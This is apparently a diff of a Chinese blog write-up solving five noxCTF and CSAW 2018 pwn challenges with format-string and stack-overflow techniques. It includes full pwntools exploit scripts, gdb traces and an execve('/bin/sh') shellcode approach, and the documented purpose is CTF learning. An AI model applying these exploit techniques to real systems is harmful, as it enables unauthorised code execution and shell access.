@@ -1,83 +1,47 @@
----
-layout: post
-title:  "nox_CSAW部分pwn题解"
-date:   2018-10-9 18:00:00
-categories: WriteUp
-tags: WriteUp,WN,noxCTF,CSAWCTF
----
-
-* content
-{:toc}
-
-```
-文章首发于安恒网络空间安全讲武堂 http://url.cn/5Abhs8n
-```
-
-## 前言
-
+前言
 暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。
 
-
-
-### NOXCTF
-
-#### PWN—believeMe(378)
-
+NOXCTF
+PWN—believeMe(378)
 惯例先走一遍file+checksec检查
 
-```bash
-  believeMe file believeMe 
+➜  believeMe file believeMe 
 believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
-  believeMe checksec believeMe 
+➜  believeMe checksec believeMe 
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-```
-
 再简单的运行下程序看看程序是什么样的结构
 
-```bash
-  believeMe ./believeMe 
+➜  believeMe ./believeMe 
 Someone told me that pwning makes noxāle...
 But......... how ???? 
 aaaa
 aaaa%  
-  believeMe
-```
-
+➜  believeMe
 然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞
 
-```c
 .text:080487CC ; 10:   printf(s);
 .text:080487CC                 sub     esp, 0Ch
 .text:080487CF                 lea     eax, [ebp+s]
 .text:080487D2                 push    eax             ; format
 .text:080487D3                 call    _printf
-```
-
 这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9
 
-```bash
-  believeMe ./believeMe 
+➜  believeMe ./believeMe 
 Someone told me that pwning makes noxāle...
 But......... how ???? 
 aaaa%9$x
 aaaa61616161%                                                         
-  believeMe 
-```
-
+➜  believeMe 
 然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
 
-```python
 payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size='short')
-```
-
 然而当我们成功修改fflush_got为noxFlag的地址时会进入到一个死循环中，我们看一下noxFlag函数里面不难发现问题
 
-```c
 void __noreturn noxFlag()
 {
   char i; // [esp+Bh] [ebp-Dh]
@@ -103,15 +67,12 @@ void __noreturn noxFlag()
   }
   exit(0);
 }
-```
-
 当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了
 
 我们gdb把断点下在printf调试一下，先查看下堆栈
 
-```bash
 gdb-peda$ stack 30
-0000| 0xffffcf1c --> 0x80487d8 (<main+129>:	add    esp,0x10)
+0000| 0xffffcf1c --> 0x80487d8 (<main+129>:    add    esp,0x10)
 0004| 0xffffcf20 --> 0xffffcf44 ("aaaa%21$x")
 0008| 0xffffcf24 --> 0x804890c --> 0xa ('\n')
 0012| 0xffffcf28 --> 0xf7fb45a0 --> 0xfbad2288 
@@ -126,8 +87,8 @@ gdb-peda$ stack 30
 0048| 0xffffcf4c --> 0xf7000078 
 0052| 0xffffcf50 --> 0x1 
 0056| 0xffffcf54 --> 0x0 
-0060| 0xffffcf58 --> 0xf7e30a50 (<__new_exitfn+16>:	add    ebx,0x1835b0)
-0064| 0xffffcf5c --> 0x804885b (<__libc_csu_init+75>:	add    edi,0x1)
+0060| 0xffffcf58 --> 0xf7e30a50 (<__new_exitfn+16>:    add    ebx,0x1835b0)
+0064| 0xffffcf5c --> 0x804885b (<__libc_csu_init+75>:    add    edi,0x1)
 0068| 0xffffcf60 --> 0x1 
 0072| 0xffffcf64 --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
 0076| 0xffffcf68 --> 0xffffd02c --> 0xffffd239 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
@@ -135,77 +96,69 @@ gdb-peda$ stack 30
 0084| 0xffffcf70 --> 0xf7fb43dc --> 0xf7fb51e0 --> 0x0 
 0088| 0xffffcf74 --> 0xffffcf90 --> 0x1 
 0092| 0xffffcf78 --> 0x0 
-0096| 0xffffcf7c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
+0096| 0xffffcf7c --> 0xf7e1a637 (<__libc_start_main+247>:    add    esp,0x10)
 --More--(25/30)
 0100| 0xffffcf80 --> 0xf7fb4000 --> 0x1b1db0 
 0104| 0xffffcf84 --> 0xf7fb4000 --> 0x1b1db0 
 0108| 0xffffcf88 --> 0x0 
-0112| 0xffffcf8c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
+0112| 0xffffcf8c --> 0xf7e1a637 (<__libc_start_main+247>:    add    esp,0x10)
 0116| 0xffffcf90 --> 0x1 
-```
-
 我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag
+
+(这里有一个挺坑的地方就是你在本地复现时终端运行得到地址和用pwntools得到的地址可能不一样，这块我还是不懂是什么原理，希望知道的师傅能讲一下学习一波。)
 
 EXP
 
+from pwn import*
+context(os='linux',arch='i386')#,log_level='debug')
+#n = process('./believeMe')
+n = remote('18.223.228.52',13337)
 
-
+shell_addr = 0x804867b
+#ret_addr = 0xffffd030 - 0x4
+ret_addr = 0xffffdd30 - 0x4
+payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size='short')
+n.recvuntil('But......... how ????')
+#n.sendline('%21$x')
+n.sendline(payload)
+n.interactive()
 FLAG
 
-```
 noxCTF{%N3ver_%7rust_%4h3_%F0rmat}
-```
-
-
-
-#### PWN—The Name Calculator
-
+PWN—The Name Calculator
 惯例检查一遍文件
 
-```bash
-  TheNameCalculator file TheNameCalculator 
+➜  TheNameCalculator file TheNameCalculator 
 TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped
-  TheNameCalculator checksec TheNameCalculator 
+➜  TheNameCalculator checksec TheNameCalculator 
 [*] '/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-```
-
 简单过一遍程序，只有一个输入
 
-```bash
-  TheNameCalculator ./TheNameCalculator 
+➜  TheNameCalculator ./TheNameCalculator 
 What is your name?
 Ep3ius 
 I've heard better
-```
+开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'*(0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825
 
-开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'* (0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825
-
-```c
 puts("What is your name?");
 fflush(stdout);
 read(0, &buf, 0x20u);
 fflush(stdin);
 if ( v4 == 0x6A4B825 )
 {
-	secretFunc();
+    secretFunc();
 }
-```
-
 进入secretFunc函数后发现函数最末尾有个格式化字符串漏洞，并且可以通过改exit_got来实现跳转，但中间有一段对输入进行一个异或加密，加密方式很简单就不再赘述，最终要达到的就是输入'aaaa%12$x'能返回未加密时格式化字符串正确的参数就算成功了，剩下的就是普通的格式化字符串改got的标准套路了，不过输入的fmt_payload的大小限制在了27而如果我们直接用fmtstr_payload生成的payload的长度是超过这个大小的，恰巧的是exit_got和superSecretFunc的前两位相同都为0x0804，所以我们的payload就不需要再改exit_got的前两位使我们payload的长度缩减至21
 
-```c
 for ( i = buf; i < (int *)((char *)&buf[-1] + v3); i = (int *)((char *)i + 1) )
     *i ^= 0x5F7B4153u;
-```
-
 encrypt
 
-```python
 def encrypt(enc):
     buf = list(enc)
     for i in range(0, len(buf) - 4):
@@ -213,13 +166,8 @@ def encrypt(enc):
         key = u32(payload)^0x5F7B4153
         buf[i:i+4] = list(p32(key))
     return ''.join(buf)
-```
-
-
-
 EXP
 
-```python
 from pwn import*
 context(os='linux',arch='i386')#,log_level='debug')
 n = process('./TheNameCalculator')
@@ -254,39 +202,24 @@ offset = 'aaaa%12$x'
 secretFunc(payload)
 
 n.interactive()
-```
-
-
-
 FLAG
 
-```
 noxCTF{M1nd_7he_Input}
-```
-
-
-
-### CSAW CTF
-
-#### PWN—bigboy
-
+CSAW CTF
+PWN—bigboy
 简单的bof类型题目，先检查文件
 
-```bash
-  bigboy file boi 
+➜  bigboy file boi 
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
-  bigboy checksec boi 
+➜  bigboy checksec boi 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-```
-
 idaF5看一下程序逻辑
 
-```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   __int64 buf; // [rsp+10h] [rbp-30h]
@@ -309,20 +242,17 @@ int __cdecl main(int argc, const char **argv, const char **envp)
     run_cmd("/bin/date");
   return 0;
 }
-```
+本以为构造payload = 'a'*(0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4
 
-本以为构造payload = 'a'* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4
-
-```bash
 [-------------------------------------code-------------------------------------]
-   0x40069b <main+90>:	mov    edi,0x0
-   0x4006a0 <main+95>:	call   0x400500 <read@plt>
-   0x4006a5 <main+100>:	mov    eax,DWORD PTR [rbp-0x1c]
-=> 0x4006a8 <main+103>:	cmp    eax,0xcaf3baee
-   0x4006ad <main+108>:	jne    0x4006bb <main+122>
-   0x4006af <main+110>:	mov    edi,0x40077c
-   0x4006b4 <main+115>:	call   0x400626 <run_cmd>
-   0x4006b9 <main+120>:	jmp    0x4006c5 <main+132>
+   0x40069b <main+90>:    mov    edi,0x0
+   0x4006a0 <main+95>:    call   0x400500 <read@plt>
+   0x4006a5 <main+100>:    mov    eax,DWORD PTR [rbp-0x1c]
+=> 0x4006a8 <main+103>:    cmp    eax,0xcaf3baee
+   0x4006ad <main+108>:    jne    0x4006bb <main+122>
+   0x4006af <main+110>:    mov    edi,0x40077c
+   0x4006b4 <main+115>:    call   0x400626 <run_cmd>
+   0x4006b9 <main+120>:    jmp    0x4006c5 <main+132>
 [------------------------------------stack-------------------------------------]
 0000| 0x7ffd1313f360 --> 0x7ffd1313f488 --> 0x7ffd131402a8 --> 0x545100696f622f2e ('./boi')
 0008| 0x7ffd1313f368 --> 0x10040072d 
@@ -337,11 +267,8 @@ Legend: code, data, rodata, value
 0x00000000004006a8 in main ()
 gdb-peda$ p $eax
 $1 = 0xdeadbe0a
-```
-
 idaF5看不出什么东西，直接切汇编
 
-```c
 mov     dword ptr [rbp+v6+4], 0DEADBEEFh
 mov     edi, offset s   ; "Are you a big boiiiii??"
 call    _puts
@@ -353,13 +280,10 @@ call    _read
 mov     eax, dword ptr [rbp+v6+4]
 cmp     eax, 0CAF3BAEEh
 jnz     short loc_4006BB
-```
-
 这里我们可以很简单就看出原因所在，eax所存的指针指向的是rbp-0x20+4而buf的首地址是指向rbp-0x30,而if语句比较的相当于在0x4006A8时的eax寄存器的值与0xCAF3BAEE是否相等，而两者的差值并非是v6与buf在栈上的距离，而实际的距离应该是0x30-0x20+4
 
 EXP
 
-```python
 from pwn import*
 context(os='linux',arch='amd64',log_level='debug')
 #n = process('./boi')
@@ -370,37 +294,23 @@ n.recvuntil('??')
 n.sendline(payload)
 
 n.interactive()
-```
-
-
-
 FLAG
 
-```
 flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
-```
-
-
-
-#### PWN—get it
-
-```bash
-  get_it file get_it 
+PWN—get it
+➜  get_it file get_it 
 get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
-  get_it checksec get_it 
+➜  get_it checksec get_it 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-```
-
 程序的逻辑很简单，一个gets溢出，也给了system('/bin/sh')函数，虽然开了NX麻烦直接shellcode来getshell，但ret2text还是很简单的就直接给exp了
 
 EXP
 
-```python
 from pwn import*
 context(os='linux',arch='amd64',log_level='debug')
 #n = process('./get_it')
@@ -414,22 +324,13 @@ n.recvuntil('it??')
 n.sendline(payload)
 
 n.interactive()
-```
-
 FLAG
 
-```
 flag{y0u_deF_get_itls}
-```
-
-
-
-#### PWN—shell->code
-
-```bash
-  shellpointcode file shellpointcode 
+PWN—shell->code
+➜  shellpointcode file shellpointcode 
 shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
-  shellpointcode checksec shellpointcode 
+➜  shellpointcode checksec shellpointcode 
 [*] '/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -437,12 +338,9 @@ shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamica
     NX:       NX disabled
     PIE:      PIE enabled
     RWX:      Has RWX segments
-```
-
 很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的
 
-```bash
-  shellpointcode ./shellpointcode 
+➜  shellpointcode ./shellpointcode 
 Linked lists are great! 
 They let you chain pieces of data together.
 
@@ -457,15 +355,12 @@ node.buffer: aaaa
 What are your initials?
 111
 Thanks 111
-```
-
 简单分析调试后可以得到栈溢出后8byte后即为返回地址，我们在写完ret地址后接着写入‘/bin/sh’可以达到在开始执行shellcode时rsp里存放的是指向/bin/sh的指针，那么便可以利用mov rdi,rsp使‘/bin/sh\0’作为execve的参数来调用execve('/bin/sh')来getshell
 
-```bash
 [----------------------------------registers-----------------------------------]
 RAX: 0x19 
 RBX: 0x0 
-RCX: 0x7f1f405832c0 (<__write_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RCX: 0x7f1f405832c0 (<__write_nocancel+7>:    cmp    rax,0xfffffffffffff001)
 RDX: 0x7f1f40852780 --> 0x0 
 RSI: 0x7ffea8fdff90 ("Thanks ", 'a' <repeats 11 times>, "h&\376\250\376\177\n\nnode.buffer: H\211\347j;X1\366\231\017\005\n\n")
 RDI: 0x1 
@@ -482,14 +377,14 @@ R14: 0x0
 R15: 0x0
 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
-   0x55d7207d08e7:	call   0x55d7207d06d0
-   0x55d7207d08ec:	nop
-   0x55d7207d08ed:	leave  
-=> 0x55d7207d08ee:	ret    
-   0x55d7207d08ef:	push   rbp
-   0x55d7207d08f0:	mov    rbp,rsp
-   0x55d7207d08f3:	sub    rsp,0x40
-   0x55d7207d08f7:	lea    rax,[rbp-0x40]
+   0x55d7207d08e7:    call   0x55d7207d06d0
+   0x55d7207d08ec:    nop
+   0x55d7207d08ed:    leave  
+=> 0x55d7207d08ee:    ret    
+   0x55d7207d08ef:    push   rbp
+   0x55d7207d08f0:    mov    rbp,rsp
+   0x55d7207d08f3:    sub    rsp,0x40
+   0x55d7207d08f7:    lea    rax,[rbp-0x40]
 [------------------------------------stack-------------------------------------]
 0000| 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948 
 0008| 0x7ffea8fe2640 --> 0x68732f6e69622f ('/bin/sh')
@@ -502,13 +397,10 @@ EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
 [------------------------------------------------------------------------------] blue
 Legend: code, data, rodata, value
 0x000055d7207d08ee in ?? ()
-```
-
 execve的汇编可以参考http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/
 
 EXP
 
-```python
 from pwn import*
 context(os='linux',arch='amd64',log_level='debug')
 n = process('./shellpointcode')
@@ -531,11 +423,6 @@ stack = int(n.recvuntil('\n'),16)
 node_2 = stack + 0x28
 n.sendline('a'*11 + p64(node_2) + '/bin/sh\0')
 n.interactive()
-```
-
 FLAG
 
-```
 flag{NONONODE_YOU_WRECKED_BRO}
-```
-
